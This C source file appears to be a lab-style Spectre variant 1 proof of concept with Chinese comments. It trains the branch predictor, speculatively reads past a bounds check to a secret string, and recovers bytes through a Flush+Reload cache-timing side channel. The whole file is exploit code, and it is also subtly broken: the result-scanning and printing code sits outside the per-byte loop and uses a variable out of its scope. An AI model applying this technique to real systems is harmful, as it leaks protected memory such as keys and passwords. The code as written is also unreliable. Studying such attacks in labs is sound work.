#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>


unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp    = 0;
char    *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  }
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;

  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }

  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 30; i++) {    // 加强训练，原本是 10
    restrictedAccess(i);  
  }

  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower); 
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 1000; z++)  {  }  // 延迟推测窗口
  //
  // Ask victim() to return the secret in out-of-order execution.
  uint8_t tmp = restrictedAccess(index_beyond);
  s = *(volatile uint8_t *)&tmp;

  array[s * 4096 + DELTA] += 1;
}

int main() {
    int i, m;
    uint8_t s;

    // 逐字节读取 secret，共读取 17 个字节
    for (m = 0; m < 17; m++) {
        // 计算目标地址：secret 和 buffer 之间的偏移
        size_t larger_x = (size_t)(secret - (char*)buffer);

        // 清空缓存侧信道
        flushSideChannel();

        // 初始化分数数组
        for (i = 0; i < 256; i++)
            scores[i] = 0;

        // 多次执行攻击以统计命中次数
        for (i = 0; i < 1000; i++) {
            spectreAttack(larger_x + m);      // 执行 Spectre 攻击，尝试泄露第 m 字节
            reloadSideChannelImproved();      // 重新加载缓存，进行侧信道探测
        }
    }

    // 从侧信道得分中找出命中次数最多的字节（推测为 secret[m]）
    int max = 1;
    for (i = 1; i < 256; i++) {
        if (scores[max] < scores[i])
            max = i;
    }

    // 打印推测出的字节信息
    printf("Reading secret value at %p = ", (void*)larger_x);
    printf("The secret value is %d - %c \n", max, max);
    printf("The number of hits is %d\n", scores[max]);

    return 0;
}



